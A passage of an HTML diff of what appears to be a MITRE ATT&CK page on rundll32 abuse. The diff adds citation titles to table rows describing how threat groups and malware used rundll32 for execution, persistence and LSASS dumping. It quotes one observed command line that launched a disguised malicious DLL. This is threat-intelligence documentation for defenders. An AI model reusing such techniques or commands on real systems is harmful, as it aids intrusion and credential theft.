-                                                            <p><a href="/versions/v14/software/S1044">FunnyDream</a> can use <code>rundll32</code> for execution of its components.<span onclick=scrollToRef('scite-50') id="scite-ref-50-a" class="scite-citeref-number" data-reference="Bitdefender FunnyDream Campaign November 2020"><sup><a href="https://www.bitdefender.com/files/News/CaseStudies/study/379/Bitdefender-Whitepaper-Chinese-APT.pdf" target="_blank" data-hasqtip="49" aria-describedby="qtip-49">[50]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/software/S1044">FunnyDream</a> can use <code>rundll32</code> for execution of its components.<span onclick=scrollToRef('scite-50') id="scite-ref-50-a" class="scite-citeref-number" title="Vrabie, V. (2020, November). Dissecting a Chinese APT Targeting South Eastern Asian Government Institutions. Retrieved September 19, 2022."data-reference="Bitdefender FunnyDream Campaign November 2020"><sup><a href="https://www.bitdefender.com/files/News/CaseStudies/study/379/Bitdefender-Whitepaper-Chinese-APT.pdf" target="_blank" data-hasqtip="49" aria-describedby="qtip-49">[50]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -917,7 +916,7 @@
                                                 <a href="/versions/v14/groups/G0047"> Gamaredon Group </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/groups/G0047">Gamaredon Group</a> malware has used rundll32 to launch additional malicious components.<span onclick=scrollToRef('scite-51') id="scite-ref-51-a" class="scite-citeref-number" data-reference="ESET Gamaredon June 2020"><sup><a href="https://www.welivesecurity.com/2020/06/11/gamaredon-group-grows-its-game/" target="_blank" data-hasqtip="50" aria-describedby="qtip-50">[51]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/groups/G0047">Gamaredon Group</a> malware has used rundll32 to launch additional malicious components.<span onclick=scrollToRef('scite-51') id="scite-ref-51-a" class="scite-citeref-number" title="Boutin, J. (2020, June 11). Gamaredon group grows its game. Retrieved June 16, 2020."data-reference="ESET Gamaredon June 2020"><sup><a href="https://www.welivesecurity.com/2020/06/11/gamaredon-group-grows-its-game/" target="_blank" data-hasqtip="50" aria-describedby="qtip-50">[51]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -929,7 +928,7 @@
                                                 <a href="/versions/v14/software/S0032"> gh0st RAT </a>
                                             </td>
                                             <td>
-                                                            <p>A <a href="/versions/v14/software/S0032">gh0st RAT</a> variant has used rundll32 for execution.<span onclick=scrollToRef('scite-52') id="scite-ref-52-a" class="scite-citeref-number" data-reference="Arbor Musical Chairs Feb 2018"><sup><a href="https://www.arbornetworks.com/blog/asert/musical-chairs-playing-tetris/" target="_blank" data-hasqtip="51" aria-describedby="qtip-51">[52]</a></sup></span></p>
+                                                            <p>A <a href="/versions/v14/software/S0032">gh0st RAT</a> variant has used rundll32 for execution.<span onclick=scrollToRef('scite-52') id="scite-ref-52-a" class="scite-citeref-number" title="Sabo, S. (2018, February 15). Musical Chairs Playing Tetris. Retrieved February 19, 2018."data-reference="Arbor Musical Chairs Feb 2018"><sup><a href="https://www.arbornetworks.com/blog/asert/musical-chairs-playing-tetris/" target="_blank" data-hasqtip="51" aria-describedby="qtip-51">[52]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -941,7 +940,7 @@
                                                 <a href="/versions/v14/software/S0342"> GreyEnergy </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/software/S0342">GreyEnergy</a> uses PsExec locally in order to execute rundll32.exe at the highest privileges (NTAUTHORITY\SYSTEM).<span onclick=scrollToRef('scite-46') id="scite-ref-46-a" class="scite-citeref-number" data-reference="ESET GreyEnergy Oct 2018"><sup><a href="https://www.welivesecurity.com/wp-content/uploads/2018/10/ESET_GreyEnergy.pdf" target="_blank" data-hasqtip="45" aria-describedby="qtip-45">[46]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/software/S0342">GreyEnergy</a> uses PsExec locally in order to execute rundll32.exe at the highest privileges (NTAUTHORITY\SYSTEM).<span onclick=scrollToRef('scite-46') id="scite-ref-46-a" class="scite-citeref-number" title="Cherepanov, A. (2018, October). GREYENERGY A successor to BlackEnergy. Retrieved November 15, 2018."data-reference="ESET GreyEnergy Oct 2018"><sup><a href="https://www.welivesecurity.com/wp-content/uploads/2018/10/ESET_GreyEnergy.pdf" target="_blank" data-hasqtip="45" aria-describedby="qtip-45">[46]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -953,7 +952,7 @@
                                                 <a href="/versions/v14/groups/G0125"> HAFNIUM </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/groups/G0125">HAFNIUM</a> has used <code>rundll32</code> to load malicious DLLs.<span onclick=scrollToRef('scite-53') id="scite-ref-53-a" class="scite-citeref-number" data-reference="Volexity Exchange Marauder March 2021"><sup><a href="https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/" target="_blank" data-hasqtip="52" aria-describedby="qtip-52">[53]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/groups/G0125">HAFNIUM</a> has used <code>rundll32</code> to load malicious DLLs.<span onclick=scrollToRef('scite-53') id="scite-ref-53-a" class="scite-citeref-number" title="Gruzweig, J. et al. (2021, March 2). Operation Exchange Marauder: Active Exploitation of Multiple Zero-Day Microsoft Exchange Vulnerabilities. Retrieved March 3, 2021."data-reference="Volexity Exchange Marauder March 2021"><sup><a href="https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/" target="_blank" data-hasqtip="52" aria-describedby="qtip-52">[53]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -965,7 +964,7 @@
                                                 <a href="/versions/v14/software/S0698"> HermeticWizard </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/software/S0698">HermeticWizard</a> has the ability to create a new process using <code>rundll32</code>.<span onclick=scrollToRef('scite-54') id="scite-ref-54-a" class="scite-citeref-number" data-reference="ESET Hermetic Wizard March 2022"><sup><a href="https://www.welivesecurity.com/2022/03/01/isaacwiper-hermeticwizard-wiper-worm-targeting-ukraine" target="_blank" data-hasqtip="53" aria-describedby="qtip-53">[54]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/software/S0698">HermeticWizard</a> has the ability to create a new process using <code>rundll32</code>.<span onclick=scrollToRef('scite-54') id="scite-ref-54-a" class="scite-citeref-number" title="ESET. (2022, March 1). IsaacWiper and HermeticWizard: New wiper and worm targetingUkraine. Retrieved April 10, 2022."data-reference="ESET Hermetic Wizard March 2022"><sup><a href="https://www.welivesecurity.com/2022/03/01/isaacwiper-hermeticwizard-wiper-worm-targeting-ukraine" target="_blank" data-hasqtip="53" aria-describedby="qtip-53">[54]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -977,7 +976,7 @@
                                                 <a href="/versions/v14/software/S1027"> Heyoka Backdoor </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/software/S1027">Heyoka Backdoor</a> can use rundll32.exe to gain execution.<span onclick=scrollToRef('scite-55') id="scite-ref-55-a" class="scite-citeref-number" data-reference="SentinelOne Aoqin Dragon June 2022"><sup><a href="https://www.sentinelone.com/labs/aoqin-dragon-newly-discovered-chinese-linked-apt-has-been-quietly-spying-on-organizations-for-10-years/" target="_blank" data-hasqtip="54" aria-describedby="qtip-54">[55]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/software/S1027">Heyoka Backdoor</a> can use rundll32.exe to gain execution.<span onclick=scrollToRef('scite-55') id="scite-ref-55-a" class="scite-citeref-number" title="Chen, Joey. (2022, June 9). Aoqin Dragon | Newly-Discovered Chinese-linked APT Has Been Quietly Spying On Organizations For 10 Years. Retrieved July 14, 2022."data-reference="SentinelOne Aoqin Dragon June 2022"><sup><a href="https://www.sentinelone.com/labs/aoqin-dragon-newly-discovered-chinese-linked-apt-has-been-quietly-spying-on-organizations-for-10-years/" target="_blank" data-hasqtip="54" aria-describedby="qtip-54">[55]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -989,7 +988,7 @@
                                                 <a href="/versions/v14/software/S0260"> InvisiMole </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/software/S0260">InvisiMole</a> has used rundll32.exe for execution.<span onclick=scrollToRef('scite-56') id="scite-ref-56-a" class="scite-citeref-number" data-reference="ESET InvisiMole June 2020"><sup><a href="https://www.welivesecurity.com/wp-content/uploads/2020/06/ESET_InvisiMole.pdf" target="_blank" data-hasqtip="55" aria-describedby="qtip-55">[56]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/software/S0260">InvisiMole</a> has used rundll32.exe for execution.<span onclick=scrollToRef('scite-56') id="scite-ref-56-a" class="scite-citeref-number" title="Hromcova, Z. and Cherpanov, A. (2020, June). INVISIMOLE: THE HIDDEN PART OF THE STORY. Retrieved July 16, 2020."data-reference="ESET InvisiMole June 2020"><sup><a href="https://www.welivesecurity.com/wp-content/uploads/2020/06/ESET_InvisiMole.pdf" target="_blank" data-hasqtip="55" aria-describedby="qtip-55">[56]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -1001,7 +1000,7 @@
                                                 <a href="/versions/v14/software/S0044"> JHUHUGIT </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/software/S0044">JHUHUGIT</a> is executed using rundll32.exe.<span onclick=scrollToRef('scite-57') id="scite-ref-57-a" class="scite-citeref-number" data-reference="F-Secure Sofacy 2015"><sup><a href="https://labsblog.f-secure.com/2015/09/08/sofacy-recycles-carberp-and-metasploit-code/" target="_blank" data-hasqtip="56" aria-describedby="qtip-56">[57]</a></sup></span><span onclick=scrollToRef('scite-58') id="scite-ref-58-a" class="scite-citeref-number" data-reference="Talos Seduploader Oct 2017"><sup><a href="https://blog.talosintelligence.com/2017/10/cyber-conflict-decoy-document.html" target="_blank" data-hasqtip="57" aria-describedby="qtip-57">[58]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/software/S0044">JHUHUGIT</a> is executed using rundll32.exe.<span onclick=scrollToRef('scite-57') id="scite-ref-57-a" class="scite-citeref-number" title="F-Secure. (2015, September 8). Sofacy Recycles Carberp and Metasploit Code. Retrieved August 3, 2016."data-reference="F-Secure Sofacy 2015"><sup><a href="https://labsblog.f-secure.com/2015/09/08/sofacy-recycles-carberp-and-metasploit-code/" target="_blank" data-hasqtip="56" aria-describedby="qtip-56">[57]</a></sup></span><span onclick=scrollToRef('scite-58') id="scite-ref-58-a" class="scite-citeref-number" title="Mercer, W., et al. (2017, October 22). "Cyber Conflict" Decoy Document Used in Real Cyber Conflict. Retrieved November 2, 2018."data-reference="Talos Seduploader Oct 2017"><sup><a href="https://blog.talosintelligence.com/2017/10/cyber-conflict-decoy-document.html" target="_blank" data-hasqtip="57" aria-describedby="qtip-57">[58]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -1013,7 +1012,7 @@
                                                 <a href="/versions/v14/groups/G0094"> Kimsuky </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/groups/G0094">Kimsuky</a> has used <code>rundll32.exe</code> to execute malicious scripts and malware on a victim's network.<span onclick=scrollToRef('scite-59') id="scite-ref-59-a" class="scite-citeref-number" data-reference="Talos Kimsuky Nov 2021"><sup><a href="https://blog.talosintelligence.com/2021/11/kimsuky-abuses-blogs-delivers-malware.html" target="_blank" data-hasqtip="58" aria-describedby="qtip-58">[59]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/groups/G0094">Kimsuky</a> has used <code>rundll32.exe</code> to execute malicious scripts and malware on a victim's network.<span onclick=scrollToRef('scite-59') id="scite-ref-59-a" class="scite-citeref-number" title="An, J and Malhotra, A. (2021, November 10). North Korean attackers use malicious blogs to deliver malware to high-profile South Korean targets. Retrieved December 29, 2021."data-reference="Talos Kimsuky Nov 2021"><sup><a href="https://blog.talosintelligence.com/2021/11/kimsuky-abuses-blogs-delivers-malware.html" target="_blank" data-hasqtip="58" aria-describedby="qtip-58">[59]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -1025,7 +1024,7 @@
                                                 <a href="/versions/v14/software/S0250"> Koadic </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/software/S0250">Koadic</a> can use Rundll32 to execute additional payloads.<span onclick=scrollToRef('scite-60') id="scite-ref-60-a" class="scite-citeref-number" data-reference="Github Koadic"><sup><a href="https://github.com/zerosum0x0/koadic" target="_blank" data-hasqtip="59" aria-describedby="qtip-59">[60]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/software/S0250">Koadic</a> can use Rundll32 to execute additional payloads.<span onclick=scrollToRef('scite-60') id="scite-ref-60-a" class="scite-citeref-number" title="Magius, J., et al. (2017, July 19). Koadic. Retrieved June 18, 2018."data-reference="Github Koadic"><sup><a href="https://github.com/zerosum0x0/koadic" target="_blank" data-hasqtip="59" aria-describedby="qtip-59">[60]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -1037,7 +1036,7 @@
                                                 <a href="/versions/v14/software/S0356"> KONNI </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/software/S0356">KONNI</a> has used Rundll32 to execute its loader for privilege escalation purposes.<span onclick=scrollToRef('scite-61') id="scite-ref-61-a" class="scite-citeref-number" data-reference="Medium KONNI Jan 2020"><sup><a href="https://medium.com/d-hunter/a-look-into-konni-2019-campaign-b45a0f321e9b" target="_blank" data-hasqtip="60" aria-describedby="qtip-60">[61]</a></sup></span><span onclick=scrollToRef('scite-62') id="scite-ref-62-a" class="scite-citeref-number" data-reference="Malwarebytes Konni Aug 2021"><sup><a href="https://blog.malwarebytes.com/threat-intelligence/2021/08/new-variant-of-konni-malware-used-in-campaign-targetting-russia/" target="_blank" data-hasqtip="61" aria-describedby="qtip-61">[62]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/software/S0356">KONNI</a> has used Rundll32 to execute its loader for privilege escalation purposes.<span onclick=scrollToRef('scite-61') id="scite-ref-61-a" class="scite-citeref-number" title="Karmi, D. (2020, January 4). A Look Into Konni 2019 Campaign. Retrieved April 28, 2020."data-reference="Medium KONNI Jan 2020"><sup><a href="https://medium.com/d-hunter/a-look-into-konni-2019-campaign-b45a0f321e9b" target="_blank" data-hasqtip="60" aria-describedby="qtip-60">[61]</a></sup></span><span onclick=scrollToRef('scite-62') id="scite-ref-62-a" class="scite-citeref-number" title="Threat Intelligence Team. (2021, August 23). New variant of Konni malware used in campaign targetting Russia. Retrieved January 5, 2022."data-reference="Malwarebytes Konni Aug 2021"><sup><a href="https://blog.malwarebytes.com/threat-intelligence/2021/08/new-variant-of-konni-malware-used-in-campaign-targetting-russia/" target="_blank" data-hasqtip="61" aria-describedby="qtip-61">[62]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -1049,7 +1048,7 @@
                                                 <a href="/versions/v14/software/S0236"> Kwampirs </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/software/S0236">Kwampirs</a> uses rundll32.exe in a Registry value added to establish persistence.<span onclick=scrollToRef('scite-63') id="scite-ref-63-a" class="scite-citeref-number" data-reference="Symantec Orangeworm April 2018"><sup><a href="https://www.symantec.com/blogs/threat-intelligence/orangeworm-targets-healthcare-us-europe-asia" target="_blank" data-hasqtip="62" aria-describedby="qtip-62">[63]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/software/S0236">Kwampirs</a> uses rundll32.exe in a Registry value added to establish persistence.<span onclick=scrollToRef('scite-63') id="scite-ref-63-a" class="scite-citeref-number" title="Symantec Security Response Attack Investigation Team. (2018, April 23). New Orangeworm attack group targets the healthcare sector in the U.S., Europe, and Asia. Retrieved May 8, 2018."data-reference="Symantec Orangeworm April 2018"><sup><a href="https://www.symantec.com/blogs/threat-intelligence/orangeworm-targets-healthcare-us-europe-asia" target="_blank" data-hasqtip="62" aria-describedby="qtip-62">[63]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -1061,7 +1060,7 @@
                                                 <a href="/versions/v14/groups/G0032"> Lazarus Group </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/groups/G0032">Lazarus Group</a> has used rundll32 to execute malicious payloads on a compromised host.<span onclick=scrollToRef('scite-64') id="scite-ref-64-a" class="scite-citeref-number" data-reference="ESET Twitter Ida Pro Nov 2021"><sup><a href="https://twitter.com/ESETresearch/status/1458438155149922312" target="_blank" data-hasqtip="63" aria-describedby="qtip-63">[64]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/groups/G0032">Lazarus Group</a> has used rundll32 to execute malicious payloads on a compromised host.<span onclick=scrollToRef('scite-64') id="scite-ref-64-a" class="scite-citeref-number" title="Cherepanov, Anton. (2019, November 10). ESETresearch discovered a trojanized IDA Pro installer. Retrieved March 2, 2022."data-reference="ESET Twitter Ida Pro Nov 2021"><sup><a href="https://twitter.com/ESETresearch/status/1458438155149922312" target="_blank" data-hasqtip="63" aria-describedby="qtip-63">[64]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -1073,7 +1072,7 @@
                                                 <a href="/versions/v14/groups/G0140"> LazyScripter </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/groups/G0140">LazyScripter</a> has used <code>rundll32.exe</code> to execute <a href="/versions/v14/software/S0250">Koadic</a> stagers.<span onclick=scrollToRef('scite-65') id="scite-ref-65-a" class="scite-citeref-number" data-reference="MalwareBytes LazyScripter Feb 2021"><sup><a href="https://www.malwarebytes.com/resources/files/2021/02/lazyscripter.pdf" target="_blank" data-hasqtip="64" aria-describedby="qtip-64">[65]</a></sup></span> </p>
+                                                            <p><a href="/versions/v14/groups/G0140">LazyScripter</a> has used <code>rundll32.exe</code> to execute <a href="/versions/v14/software/S0250">Koadic</a> stagers.<span onclick=scrollToRef('scite-65') id="scite-ref-65-a" class="scite-citeref-number" title="Jazi, H. (2021, February). LazyScripter: From Empire to double RAT. Retrieved November 24, 2021."data-reference="MalwareBytes LazyScripter Feb 2021"><sup><a href="https://www.malwarebytes.com/resources/files/2021/02/lazyscripter.pdf" target="_blank" data-hasqtip="64" aria-describedby="qtip-64">[65]</a></sup></span> </p>
 
                                             </td>
                                         </tr>
@@ -1085,7 +1084,7 @@
                                                 <a href="/versions/v14/groups/G0059"> Magic Hound </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/groups/G0059">Magic Hound</a> has used rundll32.exe to execute MiniDump from comsvcs.dll when dumping LSASS memory.<span onclick=scrollToRef('scite-66') id="scite-ref-66-a" class="scite-citeref-number" data-reference="DFIR Report APT35 ProxyShell March 2022"><sup><a href="https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell" target="_blank" data-hasqtip="65" aria-describedby="qtip-65">[66]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/groups/G0059">Magic Hound</a> has used rundll32.exe to execute MiniDump from comsvcs.dll when dumping LSASS memory.<span onclick=scrollToRef('scite-66') id="scite-ref-66-a" class="scite-citeref-number" title="DFIR Report. (2022, March 21). APT35 Automates Initial Access Using ProxyShell. Retrieved May 25, 2022."data-reference="DFIR Report APT35 ProxyShell March 2022"><sup><a href="https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell" target="_blank" data-hasqtip="65" aria-describedby="qtip-65">[66]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -1097,7 +1096,7 @@
                                                 <a href="/versions/v14/software/S0167"> Matryoshka </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/software/S0167">Matryoshka</a> uses rundll32.exe in a Registry Run key value for execution as part of its persistence mechanism.<span onclick=scrollToRef('scite-67') id="scite-ref-67-a" class="scite-citeref-number" data-reference="CopyKittens Nov 2015"><sup><a href="https://s3-eu-west-1.amazonaws.com/minervaresearchpublic/CopyKittens/CopyKittens.pdf" target="_blank" data-hasqtip="66" aria-describedby="qtip-66">[67]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/software/S0167">Matryoshka</a> uses rundll32.exe in a Registry Run key value for execution as part of its persistence mechanism.<span onclick=scrollToRef('scite-67') id="scite-ref-67-a" class="scite-citeref-number" title="Minerva Labs LTD and ClearSky Cyber Security. (2015, November 23). CopyKittens Attack Group. Retrieved September 11, 2017."data-reference="CopyKittens Nov 2015"><sup><a href="https://s3-eu-west-1.amazonaws.com/minervaresearchpublic/CopyKittens/CopyKittens.pdf" target="_blank" data-hasqtip="66" aria-describedby="qtip-66">[67]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -1109,7 +1108,7 @@
                                                 <a href="/versions/v14/software/S0576"> MegaCortex </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/software/S0576">MegaCortex</a> has used <code>rundll32.exe</code> to load a DLL for file encryption.<span onclick=scrollToRef('scite-68') id="scite-ref-68-a" class="scite-citeref-number" data-reference="IBM MegaCortex"><sup><a href="https://securityintelligence.com/posts/from-mega-to-giga-cross-version-comparison-of-top-megacortex-modifications/" target="_blank" data-hasqtip="67" aria-describedby="qtip-67">[68]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/software/S0576">MegaCortex</a> has used <code>rundll32.exe</code> to load a DLL for file encryption.<span onclick=scrollToRef('scite-68') id="scite-ref-68-a" class="scite-citeref-number" title="Del Fierro, C. Kessem, L.. (2020, January 8). From Mega to Giga: Cross-Version Comparison of Top MegaCortex Modifications. Retrieved February 15, 2021."data-reference="IBM MegaCortex"><sup><a href="https://securityintelligence.com/posts/from-mega-to-giga-cross-version-comparison-of-top-megacortex-modifications/" target="_blank" data-hasqtip="67" aria-describedby="qtip-67">[68]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -1121,7 +1120,7 @@
                                                 <a href="/versions/v14/software/S1026"> Mongall </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/software/S1026">Mongall</a> can use <code>rundll32.exe</code> for execution.<span onclick=scrollToRef('scite-55') id="scite-ref-55-a" class="scite-citeref-number" data-reference="SentinelOne Aoqin Dragon June 2022"><sup><a href="https://www.sentinelone.com/labs/aoqin-dragon-newly-discovered-chinese-linked-apt-has-been-quietly-spying-on-organizations-for-10-years/" target="_blank" data-hasqtip="54" aria-describedby="qtip-54">[55]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/software/S1026">Mongall</a> can use <code>rundll32.exe</code> for execution.<span onclick=scrollToRef('scite-55') id="scite-ref-55-a" class="scite-citeref-number" title="Chen, Joey. (2022, June 9). Aoqin Dragon | Newly-Discovered Chinese-linked APT Has Been Quietly Spying On Organizations For 10 Years. Retrieved July 14, 2022."data-reference="SentinelOne Aoqin Dragon June 2022"><sup><a href="https://www.sentinelone.com/labs/aoqin-dragon-newly-discovered-chinese-linked-apt-has-been-quietly-spying-on-organizations-for-10-years/" target="_blank" data-hasqtip="54" aria-describedby="qtip-54">[55]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -1133,7 +1132,7 @@
                                                 <a href="/versions/v14/software/S0256"> Mosquito </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/software/S0256">Mosquito</a>'s launcher uses rundll32.exe in a Registry Key value to start the main backdoor capability.<span onclick=scrollToRef('scite-69') id="scite-ref-69-a" class="scite-citeref-number" data-reference="ESET Turla Mosquito Jan 2018"><sup><a href="https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf" target="_blank" data-hasqtip="68" aria-describedby="qtip-68">[69]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/software/S0256">Mosquito</a>'s launcher uses rundll32.exe in a Registry Key value to start the main backdoor capability.<span onclick=scrollToRef('scite-69') id="scite-ref-69-a" class="scite-citeref-number" title="ESET, et al. (2018, January). Diplomats in Eastern Europe bitten by a Turla mosquito. Retrieved July 3, 2018."data-reference="ESET Turla Mosquito Jan 2018"><sup><a href="https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf" target="_blank" data-hasqtip="68" aria-describedby="qtip-68">[69]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -1145,7 +1144,7 @@
                                                 <a href="/versions/v14/groups/G0069"> MuddyWater </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/groups/G0069">MuddyWater</a> has used malware that leveraged rundll32.exe in a Registry Run key to execute a .dll.<span onclick=scrollToRef('scite-70') id="scite-ref-70-a" class="scite-citeref-number" data-reference="Securelist MuddyWater Oct 2018"><sup><a href="https://securelist.com/muddywater/88059/" target="_blank" data-hasqtip="69" aria-describedby="qtip-69">[70]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/groups/G0069">MuddyWater</a> has used malware that leveraged rundll32.exe in a Registry Run key to execute a .dll.<span onclick=scrollToRef('scite-70') id="scite-ref-70-a" class="scite-citeref-number" title="Kaspersky Lab's Global Research & Analysis Team. (2018, October 10). MuddyWater expands operations. Retrieved November 2, 2018."data-reference="Securelist MuddyWater Oct 2018"><sup><a href="https://securelist.com/muddywater/88059/" target="_blank" data-hasqtip="69" aria-describedby="qtip-69">[70]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -1157,7 +1156,7 @@
                                                 <a href="/versions/v14/software/S0637"> NativeZone </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/software/S0637">NativeZone</a> has used rundll32 to execute a malicious DLL.<span onclick=scrollToRef('scite-71') id="scite-ref-71-a" class="scite-citeref-number" data-reference="SentinelOne NobleBaron June 2021"><sup><a href="https://labs.sentinelone.com/noblebaron-new-poisoned-installers-could-be-used-in-supply-chain-attacks/" target="_blank" data-hasqtip="70" aria-describedby="qtip-70">[71]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/software/S0637">NativeZone</a> has used rundll32 to execute a malicious DLL.<span onclick=scrollToRef('scite-71') id="scite-ref-71-a" class="scite-citeref-number" title="Guerrero-Saade, J. (2021, June 1). NobleBaron | New Poisoned Installers Could Be Used In Supply Chain Attacks. Retrieved August 4, 2021."data-reference="SentinelOne NobleBaron June 2021"><sup><a href="https://labs.sentinelone.com/noblebaron-new-poisoned-installers-could-be-used-in-supply-chain-attacks/" target="_blank" data-hasqtip="70" aria-describedby="qtip-70">[71]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -1169,7 +1168,7 @@
                                                 <a href="/versions/v14/software/S0353"> NOKKI </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/software/S0353">NOKKI</a> has used rundll32 for execution.<span onclick=scrollToRef('scite-72') id="scite-ref-72-a" class="scite-citeref-number" data-reference="Unit 42 NOKKI Sept 2018"><sup><a href="https://researchcenter.paloaltonetworks.com/2018/09/unit42-new-konni-malware-attacking-eurasia-southeast-asia/" target="_blank" data-hasqtip="71" aria-describedby="qtip-71">[72]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/software/S0353">NOKKI</a> has used rundll32 for execution.<span onclick=scrollToRef('scite-72') id="scite-ref-72-a" class="scite-citeref-number" title="Grunzweig, J., Lee, B. (2018, September 27). New KONNI Malware attacking Eurasia and Southeast Asia. Retrieved November 5, 2018."data-reference="Unit 42 NOKKI Sept 2018"><sup><a href="https://researchcenter.paloaltonetworks.com/2018/09/unit42-new-konni-malware-attacking-eurasia-southeast-asia/" target="_blank" data-hasqtip="71" aria-describedby="qtip-71">[72]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -1181,7 +1180,7 @@
                                                 <a href="/versions/v14/software/S0368"> NotPetya </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/software/S0368">NotPetya</a> uses <code>rundll32.exe</code> to install itself on remote systems when accessed via <a href="/versions/v14/software/S0029">PsExec</a> or <code>wmic</code>.<span onclick=scrollToRef('scite-73') id="scite-ref-73-a" class="scite-citeref-number" data-reference="Talos Nyetya June 2017"><sup><a href="https://blog.talosintelligence.com/2017/06/worldwide-ransomware-variant.html" target="_blank" data-hasqtip="72" aria-describedby="qtip-72">[73]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/software/S0368">NotPetya</a> uses <code>rundll32.exe</code> to install itself on remote systems when accessed via <a href="/versions/v14/software/S0029">PsExec</a> or <code>wmic</code>.<span onclick=scrollToRef('scite-73') id="scite-ref-73-a" class="scite-citeref-number" title="Chiu, A. (2016, June 27). New Ransomware Variant "Nyetya" Compromises Systems Worldwide. Retrieved March 26, 2019."data-reference="Talos Nyetya June 2017"><sup><a href="https://blog.talosintelligence.com/2017/06/worldwide-ransomware-variant.html" target="_blank" data-hasqtip="72" aria-describedby="qtip-72">[73]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -1193,7 +1192,7 @@
                                                 <a href="/versions/v14/campaigns/C0022"> Operation Dream Job </a>
                                             </td>
                                             <td>
-                                                            <p>During <a href="https://attack.mitre.org/campaigns/C0022">Operation Dream Job</a>, <a href="/versions/v14/groups/G0032">Lazarus Group</a> executed malware with <code>C:\\windows\system32\rundll32.exe "C:\ProgramData\ThumbNail\thumbnail.db"</code>, <code>CtrlPanel S-6-81-3811-75432205-060098-6872 0 0 905</code>.<span onclick=scrollToRef('scite-74') id="scite-ref-74-a" class="scite-citeref-number" data-reference="ClearSky Lazarus Aug 2020"><sup><a href="https://www.clearskysec.com/wp-content/uploads/2020/08/Dream-Job-Campaign.pdf" target="_blank" data-hasqtip="73" aria-describedby="qtip-73">[74]</a></sup></span><span onclick=scrollToRef('scite-75') id="scite-ref-75-a" class="scite-citeref-number" data-reference="ESET Lazarus Jun 2020"><sup><a href="https://www.welivesecurity.com/wp-content/uploads/2020/06/ESET_Operation_Interception.pdf" target="_blank" data-hasqtip="74" aria-describedby="qtip-74">[75]</a></sup></span><span onclick=scrollToRef('scite-76') id="scite-ref-76-a" class="scite-citeref-number" data-reference="McAfee Lazarus Jul 2020"><sup><a 